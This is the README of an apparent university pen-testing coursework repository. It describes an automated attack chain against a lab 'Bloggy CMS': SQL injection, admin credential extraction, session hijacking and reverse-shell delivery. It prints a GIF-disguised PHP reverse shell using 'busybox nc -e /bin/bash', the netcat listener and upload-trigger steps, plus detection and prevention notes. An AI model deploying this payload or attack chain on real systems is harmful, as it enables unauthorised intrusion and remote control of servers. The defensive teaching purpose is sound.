# 37ethical-filestore-security-lab

# Bloggy CMS Penetration Testing Toolset

## 📋 Overview

This repository contains two complementary penetration testing tools developed for the ST5063CEM Practical Pen-Testing coursework at Softwarica College of IT & E-Commerce (in collaboration with Coventry University).

The toolset is designed to demonstrate a complete attack chain against the Bloggy CMS platform, from initial reconnaissance to reverse shell access.

---

## 📁 Repository Contents

| File | Description |
|------|-------------|
| `sandesh.py` | Main automated penetration testing tool (6-phase attack chain) |
| `sandesh.gif` | Masqueraded PHP reverse shell payload (GIF header evasion) |

---

# Tool 1: Bloggy CMS Exploitation Framework (`sandesh.py`)

## 📊 Tool Information

```
Name: Bloggy CMS Penetration Testing Tool
Filename: sandesh.py
Version: 2.0.2
Author: Security Research Team
Target: http://bloggy.ethical37.com
Language: Python 3
```

## 🔧 Features

The tool automates a complete 6-phase penetration test:

| Phase | Module | Description |
|-------|--------|-------------|
| 1 | Database Query Engine | Discovers user tables via SQL injection |
| 2 | Credential Extractor | Identifies username/password columns |
| 3 | Admin Credential Harvester | Extracts admin credentials from database |
| 4 | Session Operator | Authenticates using stolen credentials |
| 5 | Session Storage Locator | Finds PHP session files on server |
| 6 | Payload Deployer | Delivers reverse shell payload |

## 📋 Prerequisites

### Required Python Packages
```bash
pip install requests colorama
```

### System Requirements
- Python 3.6 or higher
- Netcat (for listener)
- Access to target network (authorized testing only)

## 🚀 Usage

### Basic Command
```bash
python3 sandesh.py <LHOST> <LPORT>
```

### Parameters
| Parameter | Description | Example |
|-----------|-------------|---------|
| `LHOST` | Your IP address for reverse connection | `10.12.35.41` |
| `LPORT` | Port for reverse shell listener | `4444` |

### Example
```bash
python3 sandesh.py 10.12.35.41 4444
```

## 🔄 Execution Workflow

1. **Run the tool** with your listener IP and port
2. **Tool performs automated enumeration** (Phases 1-5)
   - Discovers database tables
   - Identifies credential columns
   - Extracts admin username/password
   - Authenticates and captures session
   - Locates session file on server
3. **Tool pauses and asks you to start listener**
4. **Start netcat listener** in another terminal:
   ```bash
   nc -lvnp 4444
   ```
5. **Press ENTER** in the tool to continue
6. **Tool delivers payload** and establishes reverse shell

### Expected Output
```
╔══════════════════════════════════════════════════════════╗
║  Bloggy CMS Security Assessment Tool                    ║
║  Target: http://bloggy.ethical37.com                    ║
║  Callback: 10.12.35.41:4444                              ║
╚══════════════════════════════════════════════════════════╝

[ Module 1 ] Scanning database structure...
  ✓ Located: users
  ✓ Located: user_accounts
  ℹ Found 2 table(s)

[ Module 2 ] Analyzing table schemas...
  → Inspecting: users
  ✓ Identified: username (user), password (pass)

[ Module 3 ] Extracting administrator credentials...
  ✓ Admin credentials recovered!
    Username: admin
    Password: admin123

[ Module 4 ] Establishing authenticated session...
  ✓ Session established: a1b2c3d4...

[ Module 5 ] Locating session storage...
  ✓ Session file located: /tmp/sess_a1b2c3d4

[!] ACTION REQUIRED
    Start a netcat listener: nc -lvnp 4444
    Press ENTER when listener is ready...

[ Module 6 ] Deploying reverse shell payload...
  → Payload size: 42 bytes
  → Callback: 10.12.35.41:4444
  → Triggering payload...

  ==================================================
  🔥 REVERSE SHELL ESTABLISHED 🔥
  ==================================================
  Check your listener on 10.12.35.41:4444
```

---

# Tool 2: Masqueraded Reverse Shell (`sandesh.gif`)

## 📊 File Information

```
Name: Masqueraded PHP Reverse Shell
Filename: sandesh.gif
Type: GIF image with embedded PHP code
Technique: GIF header evasion
Payload: Reverse shell via busybox netcat
```

## 🔧 Technical Details

### File Structure
```
┌─────────────────────────────────┐
│ GIF89a Header (6 bytes)         │◄── Bypasses image validation
├─────────────────────────────────┤
│ PHP Reverse Shell Code          │◄── Executes when accessed
├─────────────────────────────────┤
│ __halt_compiler()                │◄── Stops PHP parsing
├─────────────────────────────────┤
│ Binary GIF Data                  │◄── Legitimate image data
└─────────────────────────────────┘
```

### Payload Code
```php
GIF89a
<?php
  echo system('busybox nc <LHOST> <LPORT> -e /bin/bash');
__halt_compiler();
[Binary GIF data...]
```

## 🚀 Usage

### 1. Create/Modify the File

#### On Linux/Mac:
```bash
# Edit the file to set your IP and port
sed -i 's/10.12.1.77/YOUR_IP/g' sandesh.gif
sed -i 's/9988/YOUR_PORT/g' sandesh.gif
```

#### On Windows (PowerShell):
```powershell
# Read the file, replace content, save
$content = Get-Content -Path sandesh.gif -Raw
$content = $content -replace '10.12.1.77', 'YOUR_IP'
$content = $content -replace '9988', 'YOUR_PORT'
$content | Out-File -FilePath sandesh.gif -Encoding ASCII
```

### 2. Set Up Listener
```bash
nc -lvnp <YOUR_PORT>
```

### 3. Upload/Trigger the Payload
- Upload through file upload vulnerabilities
- Access via web browser: `http://target.com/uploads/sandesh.gif`
- The PHP code executes when the file is accessed

## 🔍 Detection & Prevention Notes

### Indicators of Compromise (IoCs)
- Files with GIF header but PHP content
- Presence of `busybox nc` in PHP code
- Files containing `__halt_compiler()`
- Unexpected reverse shell connections

### Prevention Measures
1. **Validate file content**, not just headers
2. **Disable execution** in upload directories
3. **Use whitelist** of allowed file types
4. **Implement WAF rules** for PHP in images
5. **Regular security scans** for webshells

---

# 🎓 Coursework Integration

## ST5063CEM - Practical Pen-Testing

This toolset is designed to demonstrate:
- **SQL Injection** (Union-based extraction)
- **Authentication Bypass** (Session hijacking)
- **File Upload Vulnerabilities** (GIF masquerading)
- **Reverse Shell Deployment** (Remote code execution)

### Report Documentation Structure

| Section | Content |
|---------|---------|
| Introduction | Target scope and methodology |
| Phase 1-3 | Database enumeration and credential harvesting |
| Phase 4-5 | Authentication and session analysis |
| Phase 6 | Reverse shell deployment |
| Remediation | Security recommendations |

---

# ⚠️ Important Legal & Ethical Notice

## AUTHORIZED USE ONLY

This toolset is designed **SOLELY** for:
- 🎓 **Educational purposes** in controlled lab environments
- 📝 **Authorized penetration testing** with written consent
- 🏫 **Coursework assignments** at Softwarica College

## NEVER use against:
- ❌ Systems you don't own
- ❌ Networks without written authorization
- ❌ Production environments without permission
- ❌ Any target outside your coursework scope

## Legal Compliance
- Unauthorized access to computer systems is illegal
- Violates Computer Misuse Act (UK/Nepal) and similar laws worldwide
- Can result in criminal charges, fines, and imprisonment

---


